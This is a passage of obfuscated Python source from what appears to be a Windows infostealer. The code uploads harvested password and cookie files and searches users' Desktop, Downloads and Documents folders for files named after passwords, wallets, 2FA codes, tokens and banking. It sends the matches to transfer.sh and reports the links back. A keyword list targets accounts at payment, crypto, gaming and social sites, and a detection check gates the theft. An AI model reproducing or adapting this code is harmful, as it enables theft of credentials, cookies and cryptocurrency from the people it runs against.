    global upths #line:1530
    upths =[]#line:1531
    for O0O0OO00OO0OOO0OO in ["zg_allpasswords.txt","zg_allcookies.txt"]:#line:1533
        upload (os .getenv ("TEMP")+"\\"+O0O0OO00OO0OOO0OO )#line:1534
def uploadToAnonfiles (O0O0O0OO00OOOO0O0 ):#line:1537
    try :#line:1538
        OOOO0OO0O0O00OO00 ={"file":(O0O0O0OO00OOOO0O0 ,open (O0O0O0OO00OOOO0O0 ,mode ='rb'))}#line:1540
        ...#line:1541
        O0O000O0O0O0OOO00 =requests .post ("https://transfer.sh/",files =OOOO0OO0O0O00OO00 )#line:1542
        OO00OO0O0OO00000O =O0O000O0O0O0OOO00 .text #line:1543
        return OO00OO0O0OO00000O #line:1544
    except :#line:1545
        return False #line:1546
def zazagrabedezFolder (OOO00O00O0O0O00O0 ,OO00OOO000O000OOO ):#line:1548
    global zazagrabedezFiles #line:1549
    O00O0O0OO0O0OO0O0 =7 #line:1550
    OOO00OOO0O0O00OO0 =0 #line:1551
    OO000OO000OO0OOO0 =os .listdir (OOO00O00O0O0O00O0 )#line:1552
    O00000OOO000OO0O0 =[]#line:1553
    for OO00OOOOOO00OO0OO in OO000OO000OO0OOO0 :#line:1554
        if not os .path .isfile (OOO00O00O0O0O00O0 +"/"+OO00OOOOOO00OO0OO ):return #line:1555
        OOO00OOO0O0O00OO0 +=1 #line:1556
        if OOO00OOO0O0O00OO0 <=O00O0O0OO0O0OO0O0 :#line:1557
            OO0000OOO000O00O0 =uploadToAnonfiles (OOO00O00O0O0O00O0 +"/"+OO00OOOOOO00OO0OO )#line:1558
            O00000OOO000OO0O0 .append ([OOO00O00O0O0O00O0 +"/"+OO00OOOOOO00OO0OO ,OO0000OOO000O00O0 ])#line:1559
        else :#line:1560
            break #line:1561
    zazagrabedezFiles .append (["folder",OOO00O00O0O0O00O0 +"/",O00000OOO000OO0O0 ])#line:1562
zazagrabedezFiles =[]#line:1564
def zazagrabedezFile (OOOOOOOOO000OOOOO ,O00O0OO000OO0OOO0 ):#line:1565
    global zazagrabedezFiles #line:1566
    O0000000O0OO00O0O =[]#line:1567
    O00OOO0O0OO00000O =os .listdir (OOOOOOOOO000OOOOO )#line:1568
    for O0OO0OO000OOOO000 in O00OOO0O0OO00000O :#line:1569
        for OO0O0O0O00OOOOOO0 in O00O0OO000OO0OOO0 :#line:1570
            if OO0O0O0O00OOOOOO0 in O0OO0OO000OOOO000 .lower ():#line:1571
                if os .path .isfile (OOOOOOOOO000OOOOO +"/"+O0OO0OO000OOOO000 )and ".txt"in O0OO0OO000OOOO000 :#line:1572
                    O0000000O0OO00O0O .append ([OOOOOOOOO000OOOOO +"/"+O0OO0OO000OOOO000 ,uploadToAnonfiles (OOOOOOOOO000OOOOO +"/"+O0OO0OO000OOOO000 )])#line:1573
                    break #line:1574
                if os .path .isdir (OOOOOOOOO000OOOOO +"/"+O0OO0OO000OOOO000 ):#line:1575
                    O0O0O000OOO000000 =OOOOOOOOO000OOOOO +"/"+O0OO0OO000OOOO000 #line:1576
                    zazagrabedezFolder (O0O0O000OOO000000 ,O00O0OO000OO0OOO0 )#line:1577
                    break #line:1578
    zazagrabedezFiles .append (["folder",OOOOOOOOO000OOOOO ,O0000000O0OO00O0O ])#line:1580
def zazagrabedez ():#line:1582
    OOO0000O0O00000O0 =temp .split ("\AppData")[0 ]#line:1583
    O0OO0OO0OOO0O0000 =[OOO0000O0O00000O0 +"/Desktop",OOO0000O0O00000O0 +"/Downloads",OOO0000O0O00000O0 +"/Documents"]#line:1588
    O0O000000OOOOO0OO =["account","acount","passw","secret"]#line:1596
    OOO0OO0OO0O0O0000 =["passw","mdp","motdepasse","mot_de_passe","login","secret","account","acount","paypal","banque","account","metamask","wallet","crypto","exodus","discord","2fa","code","memo","compte","token","backup","seecret"]#line:1622
    O000OO000000000OO =[]#line:1624
    for OOO000O00000000OO in O0OO0OO0OOO0O0000 :#line:1625
        OOOO0O000OO0000OO =threading .Thread (target =zazagrabedezFile ,args =[OOO000O00000000OO ,OOO0OO0OO0O0O0000 ]);OOOO0O000OO0000OO .start ()#line:1626
        O000OO000000000OO .append (OOOO0O000OO0000OO )#line:1627
    return O000OO000000000OO #line:1628
global keyword ,cookiWords ,paswWords #line:1631
keyword =['mail','[coinbase](https://coinbase.com)','[sellix](https://sellix.io)','[gmail](https://gmail.com)','[steam](https://steam.com)','[discord](https://discord.com)','[riotgames](https://riotgames.com)','[youtube](https://youtube.com)','[instagram](https://instagram.com)','[tiktok](https://tiktok.com)','[twitter](https://twitter.com)','[facebook](https://facebook.com)','card','[epicgames](https://epicgames.com)','[spotify](https://spotify.com)','[yahoo](https://yahoo.com)','[roblox](https://roblox.com)','[twitch](https://twitch.com)','[minecraft](https://minecraft.net)','bank','[paypal](https://paypal.com)','[origin](https://origin.com)','[amazon](https://amazon.com)','[ebay](https://ebay.com)','[aliexpress](https://aliexpress.com)','[playstation](https://playstation.com)','[hbo](https://hbo.com)','[xbox](https://xbox.com)','buy','sell','[binance](https://binance.com)','[hotmail](https://hotmail.com)','[outlook](https://outlook.com)','[crunchyroll](https://crunchyroll.com)','[telegram](https://telegram.com)','[pornhub](https://pornhub.com)','[disney](https://disney.com)','[expressvpn](https://expressvpn.com)','crypto','[uber](https://uber.com)','[netflix](https://netflix.com)']#line:1635
cookiWords =[]#line:1638
paswWords =[]#line:1639
GatherAll ()#line:1641
DETECTED =Trust (Cookies )#line:1642
if not DETECTED :#line:1644
    wikith =zazagrabdez ()#line:1645
    for thread in wikith :thread .join ()#line:1647
    time .sleep (0.2 )#line:1648
    filetext ="\n"#line:1650
    for arg in zazagrabedezFiles :#line:1651
        if len (arg [2 ])!=0 :#line:1652
            foldpath =arg [1 ]#line:1653
            foldlist =arg [2 ]#line:1654
            filetext +=f"```diff\n"#line:1655
            filetext +=f"- {foldpath}\n"#line:1656
            for ffil in foldlist :#line:1658
                a =ffil [0 ].split ("/")#line:1659
                fileanme =a [len (a )-1 ]#line:1660
                b =ffil [1 ]#line:1661
                filetext +=f"+ Name: {fileanme}\n+ Link: {b}"#line:1662
                filetext +="\n```"#line:1663
                filetext +="\n"#line:1664
    upload ("zazagrabedez",filetext )#line:1665
